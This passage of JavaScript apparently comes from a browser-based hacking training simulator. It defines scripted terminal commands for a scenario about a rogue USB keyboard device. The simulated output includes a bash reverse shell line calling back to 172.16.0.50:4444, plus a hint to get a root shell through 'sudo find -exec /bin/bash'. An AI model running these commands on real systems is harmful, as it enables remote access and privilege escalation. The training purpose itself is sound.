Mar 20 09:14:22 MAINT-TERM-01 sshd[1244]: Server listening on 0.0.0.0 port 22.
Mar 20 09:14:24 MAINT-TERM-01 kernel: usb 1-1: interface 1 -> hid-generic loaded
Mar 20 09:14:50 MAINT-TERM-01 sshd[1291]: Accepted password for maintuser from 172.16.0.50 port 44712`;
        },

        'file': function(args, term, engine) {
            const target = args[0] || '';
            if (target.includes('ghost_device.py')) return 'ghost_device.py: Python script, ASCII text executable';
            if (target.includes('usb_capture.pcapng')) return 'usb_capture.pcapng: pcapng capture file - version 1.0';
            if (target.includes('id_rsa')) return '/opt/diagnostics/.ssh/id_rsa: OpenSSH private key (passphrase protected)';
            if (target.includes('maint_specs') || target.includes('.txt')) return target + ': ASCII text';
            return target + ': data';
        },

        'strings': function(args, term, engine) {
            const target = args[0] || '';
            if (target.includes('usb_capture')) {
                return `Nexus Diagnostics Probe v2
Microchip Technology
idVendor=04d8
idProduct=003f
bInterfaceClass=03
HID Keyboard
hid-generic
bash -i >& /dev/tcp/172.16.0.50/4444 0>&1
xterm
/bin/bash`;
            }
            return 'strings: ' + target + ': no strings found';
        },

        'grep': function(args, term, engine) {
            // Passthrough helper — most meaningful grep scenarios are handled
            // by the commands that accept | grep piped input directly
            const fullCmd = args.join(' ');
            if (fullCmd.includes('usb') && fullCmd.includes('dmesg')) {
                return C14Config.commands.dmesg(['usb'], term, engine);
            }
            if (fullCmd.includes('svcaccount') && fullCmd.includes('sudoers')) {
                return 'svcaccount ALL=(root) NOPASSWD: /usr/bin/find';
            }
            return ''; // empty — let built-in handle
        },

        'find': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // sudo find escalation — handled by sudo command
            // find without sudo — normal usage
            if (C14Config._context === 'inner-sanctum' || C14Config._context === 'root-sanctum') {
                if (fullCmd.includes('-exec') && (fullCmd.includes('bash') || fullCmd.includes('/bin/sh'))) {
                    if (C14Config._context === 'inner-sanctum') {
                        return 'find: Permission denied for privilege escalation without sudo.\nHint: Try: sudo find / -exec /bin/bash \\;';
                    }
                    C14Config._switchContext('root-sanctum', term);
                    return 'root@INNER-SANCTUM-SERVER-01:~#\n[+] Shell spawned as root via find -exec.';
                }
                if (fullCmd.includes('/root') || fullCmd.includes('directive')) {
                    if (C14Config._context === 'inner-sanctum') {
                        return 'find: /root: Permission denied';
                    }
                    return '/root/grand_strategic_directive.txt';
                }
                return '/home/svcaccount/.bash_history\n/home/svcaccount/system_status.txt\n/etc/sudoers\n/var/log/auth.log';
            }
            return null; // fall through to built-in
        },

        'wireshark': function(args, term, engine) {
            return '[*] Wireshark GUI would launch here.\n[*] To analyze the USB capture without a GUI:\n    strings usb_capture.pcapng\n    tshark -r usb_capture.pcapng -T fields -e usb.transfer_type\n\n[+] Key finding from usb_capture.pcapng:\n    Frame 16: bInterfaceClass=0x03 (HID) — hid-generic loaded without VID/PID check\n    Frame 23+: HID keyboard reports — keystrokes injected as root input to terminal';
        },

        'tshark': function(args, term, engine) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('usb_capture')) {
                return `Running as user "kali".
Capturing on 'usb_capture.pcapng'

  1   0.000000 host -> 1.3.1 USB GET_DESCRIPTOR Request DEVICE
  2   0.001204 1.3.1 -> host USB GET_DESCRIPTOR Response DEVICE (04d8:003f)
 13   0.043200 1.3.1 -> host USB CONFIGURATION idVendor=04d8 idProduct=003f
 15   0.043900 1.3.1 -> host USB INTERFACE bInterfaceClass=0xff (Vendor Specific)
 16   0.044100 1.3.1 -> host USB INTERFACE bInterfaceClass=0x03 (HID Keyboard)
 17   0.044500 1.3.1 -> host USB HID Descriptor wDescriptorLength=63
 23   0.046000 1.3.1 -> host USB HID interrupt IN: Key DOWN [KEY_T]
 24   0.046100 1.3.1 -> host USB HID interrupt IN: Key DOWN [KEY_E]
 25   0.046200 1.3.1 -> host USB HID interrupt IN: Key DOWN [KEY_R]
 ...  ...
247   0.448000 1.3.1 -> host USB HID interrupt IN: Key DOWN [KEY_ENTER]

[!] 47 HID keyboard events injected. Full reverse shell command delivered.`;
            }
            return 'tshark: no interfaces specified — use -r <file> to read a capture file.';
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#8e44ad; border-bottom:2px solid #ddd; background:#f8f4fc;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #eee;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
